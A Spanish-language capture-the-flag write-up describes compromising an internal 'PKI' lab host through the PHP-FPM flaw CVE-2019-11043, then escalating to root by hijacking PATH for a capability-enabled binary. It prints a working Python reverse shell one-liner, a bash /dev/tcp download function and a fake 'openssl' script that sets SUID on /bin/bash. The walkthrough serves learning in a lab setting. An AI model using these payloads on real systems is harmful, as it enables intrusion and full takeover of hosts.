Nada más entrar, nos encontramos con unos mensajes que **de momento** parecen no indicarnos nada, solo el nombre de **un binario que usaremos más adelante**. Si fuzzeamos la web, tampoco encontramos nada, pero la cosa cambia si miramos las cabeceras (`headers`) de la respuesta...

```
* Connected to localhost (::1) port 80 (#0)                                                                                      [5/7]
> GET / HTTP/1.1
> Host: localhost
> User-Agent: curl/7.74.0                                          
> Accept: */*               
>                       
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.0 (Ubuntu)                                    
< Date: Sun, 19 Dec 2021 16:43:21 GMT        
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive                                           
< X-Powered-By: PHP-FPM/7.1 <---------------------------------
< 
```

Vemos que usa `PHP-FPM/7.1`. Si buscamos acerca de este, podemos encontrar lo siguiente:

> Basicamente, en pocas palabras, `PHP-FPM` (`PHP-FastCGI Process Manager`) es un gestor de procesos que permite crear y gestionar cierta clase de procesos, pero vamos a lo que nos interesa... 

...

Gracias a [este exploit](https://github.com/theMiddleBlue/CVE-2019-11043) podemos tratar de obtener Ejecución Remota de Comandos en el equipo PKI. Vamoss a probarlo...

Nos descargamos el exploit y lo ejecutamos de la siguiente manera:

```bash
$ curl https://raw.githubusercontent.com/theMiddleBlue/CVE-2019-11043/master/exploit.py > exploit.py

$ chmod +x exploit.py

$ python3 exploit.py -h
usage: exploit.py [-h] --url URL [--verbose] [--skip-rce] [--reset]

optional arguments:
  -h, --help  show this help message and exit
  --url URL   Target URL (ex: http://localhost/index.php)
  --verbose   show verbose output
  --skip-rce  just test the vulnerability
  --reset     reset all injected settings
```

Vemos que le podemos meter diferentes paramentros... Yo en lo personal le voy a añadir el parámetro `--verbose`, y, evidentemente, el paramentro `--url`

```bash
$ python3 exploit.py --url http://localhost/index.php --verbose
...
```

Tras esperar un poco, la fiesta comienza!

![La imagen no ha podido ser cargada. Pls recarga la pagina!](/img/static/fiesta.png)

Cuando esto acaba de bombardear el servidor Web, nos dice que deberiamos poder ejecutar comandos desde `http://localhost/index.php?a=bin/ls+/`. Vamos a probarlo

![La imagen no ha podido ser cargada. Pls recarga la pagina!](/img/static/finexploit.png)

Si intentamos ejecutar `/usr/bin/id` (Las rutas de los binarios deben ser rutas absolutas), vemos que obtenemos un puñado de texto. 

![La imagen no ha podido ser cargada. Pls recarga la pagina!](/img/static/rcemal.png)

Para poder leer mejor el output de los comandos, simplemente pulsamos `CTRL + U` para ver el Source de la página.

![La imagen no ha podido ser cargada. Pls recarga la pagina!](/img/static/rceok.png)

Y ya podemos ver esto mejor. Vamos a buscar algo con lo que podamos obtener una Shell en condiciones 😄.

### Obteniendo una Reverse Shell en el equipo PKI<a id=18></a>

Al localizar varios binarios que nos permiten obtener una Reverse Shell, podemos encontrar esto...

```
view-source:http://localhost/index.php?a=/usr/bin/which python3
-> /usr/bin/python3

view-source:http://localhost/index.php?a=/bin/ls -l /usr/bin/python3
-> lrwxrwxrwx 1 root root 9 Oct 25  2018 /usr/bin/python3 -> python3.6

view-source:http://localhost/index.php?a=/usr/bin/which python3.6
-> /usr/bin/python3.6
```

Tenemos Python!

Ahora el dilema es que, como no podemos ver al equipo "PKI" (Sin contar el puerto 80, gracias al Port Forwarding), deberemos enviarle la Shell a un equipo que tenga conectividad con "PKI", es decir, contra el equipo "web". Para ello, gracias a que **ya habiamos descargado Netcat antes**, solo tendremos que ponernos en escucha usando el binario transferido.

> En caso de necesitar transferir el archivo ahora, el servidor web de python deberá correr en un puerto diferente al 80, ya que este está en uso por el Port Forwarding.

```bash
$ ./ncat -nlvp 1234
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

Y nos entablamos la Shell enviandole una petición a la siguiente URL (Reverse Shell con python)

`view-source:http://localhost/index.php?a=/usr/bin/python3.6 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

![La imagen no ha podido ser cargada. Pls recarga la pagina!](/img/static/shellpki.png)

Ahora solo falta convertir esto en una Shell interactiva (Poder hacer CTRL + C, CTRL + L, usar las flechas, etc)...

```bash
$ script /dev/null -c bash
...
[Pulsamos CTRL + Z]

$ stty raw -echo;fg
...
reset
...
xterm
...
export SHELL=bash
export TERM=xterm
```

Y ya estamos dentro de PKI!

<br>

## **Escalando privilegios en el equipo "PKI"**<a id=19></a>

Vamos a enumerar un poco el Sistema.

...

```bash
$ getcap -r / 2>/dev/null
/usr/bin/ersatool = cap_setuid+eip
```

Interesante... Parece que lo que buscamos está en el binario `/usr/bin/ersatool`, que, curiosamente, es el que vemos reflejado en la Web de este mismo equipo. Vamos a investigar!


### Investigando el Binario ersatool<a id=20></a>

Vamos a ejecutarlo a ver...

```bash
$ ersatool
#
create|print|revoke|exit
...
```

Al parecer, esto es lo que se usa para generar los archivos de configuración de la VPN a la que estamos conectados. ..

Si intentamos leer algun archivo de estos escribiendo `print`, podemos ver la ruta donde aparentemente se generan los arhivos:

```bash
$ ersatool 
# print
print->CN=test
test[!] ERR reading /opt/easyrsa/clients/test.ovpn!
```

Vemos que los genera en `/opt/easyrsa/`, pero que no tenemos permiso para acceder (Ahí entra en juego la capability):

```bash
$ cd /opt/easyrsa/
bash: cd: easyrsa/e: Permission denied
```

> Esta capability permite al binario en cuestion, en este caso, cambiar nuestra UID de www-data (33) a la de root (0), aunque no tienen porque ser esos dos valores, pero son los que más sentido tienen 😆. En este caso, sabemos que nos la pone a "0", ya que podemos acceder a un directorio en que solo root puede acceder! Por lo tanto, probablemente, cualquier cosa que ejecute el binario, lo hará como root.

...

Parece que los tipicos métodos de injección no funcionan, por lo tanto, vamos a ver que se está ejecutando por detras a nivel de procesos. Para ello, hay que transferirse pspy desde nuestra máquina de atacante al equipo "PKI".

Nos descargamos pspy64, abrimos un servidor http por Python y lo transferimos al equipo "web" (Luego lo transferiremos al equipo "PKI").

Una vez transferido al equipo "web", si nos abrimos un servidor http por python, al tratar de transferirnoslo, vemos que no tenemos ni `curl`, `wget`, `NetCat`, ni nada para poder mandar una petición... 

...

Si investigamos un poco acerca de como usar curl sin tenerlo instalado, nos encontramos con [este hilo](https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et) donde podemos encontrar la siguiente función en Bash que actua como `curl`:

```bash
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```
Simplemente lo ejecutamos en el equipo "PKI" y ya estaria lista la función.

Para transferir el pspy (No sin antes abrir el Servidor HTTP en "web"), ejecutamos la función previamente declarada de la siguiente forna:

```bash
$ __curl http://192.168.254.2:1234/pspy64 > pspy64
```

Y ya tendríamos el pspy por aquí! Ahora solo falta conectarnos con otra sesión para poder ejecutar el pspy en paralelo al `ersatool`.

Abrimos el pspy por un lado y, por otro lado, vamos jugando con el binario `ersatool` a ver que se va ejecutando...

Al ejecutar la función `create`, podemos ver que se ejecutan algunos binarios, pero lo más interesante es que no se ejecutan por su ruta absoluta (`/usr/bin/loquesea`), sinó que se ejecutan por el nombre del binario, aprovechando que su ruta está dentro de la variable $PATH.

![La imagen no ha podido ser cargada. Pls recarga la pagina!](/img/static/pspy.png)

```bash
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Tenemos que el binario ejecuta cosas con los mismo privilegios que root, y que esas cosas las ejecuta basandose en la variable $PATH, variable que podemos modificar a nuestro gusto...

### Explotando un Path Hijacking para poder convertirnos en root<a id=21></a>

> Cuando se ejecuta un binario directamente por su **nombre** y no por su **ruta**, realmente lo que el sistema hace es buscar si existe ese binario dentro de ciertos directorios, directorios que coge de la variable $PATH, es decir: la variable $PATH es recorrida de izquierda a derecha en busca del binario en cuestion, si lo encuentra, lo ejecuta y deja de buscar (Si lo ha encontrado, para que seguir buscando) y, si no lo encuentra, simplemente no lo puede ejecutar. 

> Podemos aprovecharnos de esto para que en vez de ejecutar el fichero `openssl`, que se encuentra en `/usr/bin/openssl`, se ejecute el fichero `openssl`, que se encuentra en `/tmp/c/openssl` (Ruta que he creado yo. Puede ser la ruta que sea) y que contiene código malicioso el cual ejecutaremos como si fuesemos el usuario `root`.

Para hacer esto, simplemente vamos al directorio `/tmp/`, donde tenemos permisos para hacer travesuras, y ejecutamos:

```bash
$ export PATH=/tmp/c:$PATH

$ echo $PATH
/tmp/c:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Ahora el sistema se fijará primero en si el binario que se está llamando sin proporcionar su ruta absoluta está en `/tmp/c`.

Ahora solo falta crear un script que le asigne permisos SUID a `/bin/bash` (El permiso SUID lo que nos permite es ejecutar un fichero como su propietario: en este caso, ejecutar bash como root). Para ello, ya que no existe nano ni vim, lo crearemos en nuestro sistema, lo copiaremos en base64 y lo decodificaremos en el equipo "PKI" para luego escribirlo en un archivo llamado `openssl`.

El archivo `openssl`:
```bash
#!/bin/bash
chmod u+s /bin/bash
```

Lo convertimos a base64:
```bash
$ /usr/bin/cat ./openssl|base64         
IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo=
```

En la "PKI":
```bash
$ echo "IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo=" | base64 -d > openssl
```

Una vez hecho esto, si ejecutamos el binario `ersatool` y ejecutamos su funcion `create`, deberia ejecutarse el `openssl` malicioso, no sin antes, otorgarle permisos de ejecución con `$ chmod +x openssl`.

...

Una vez ejecutado, si hacemos un `$ ls -l /bin/bash`, podremos ver que la `x` (permiso de ejecución), se ha convertido en una `s` (Permiso SUID). 

![La imagen no ha podido ser cargada. Pls recarga la pagina!](/img/static/suid.png)

Así que, `/bin/bash -p` y...

![La imagen no ha podido ser cargada. Pls recarga la pagina!](/img/static/root.png)

> Ahora, personalmente le quito los permisos SUID a la bash para no entrometerse en la experiencia de los demás Users!

```bash
$ chmod u-s /bin/bash
```

Y recojo mi basura (Elimino los directorios que he estado usando para guardar archivos como netcat o pspy).

<br>

## **Mi opinión sobre la máquina**<a id=22></a>

En mi opinión, una máquina muy buena y divertida de hacer que toca pivoting a full. Empece la máquina sin saber casi ni nada sobre el tema de pivoting (y relacionados) y ahora, tras hacerla dos veces, considero que he aprendido bastante sobre este tema. La recomiendo 100%! También ha estado muy chula la parte del TOTP con el NTP y de la escalada 😀.
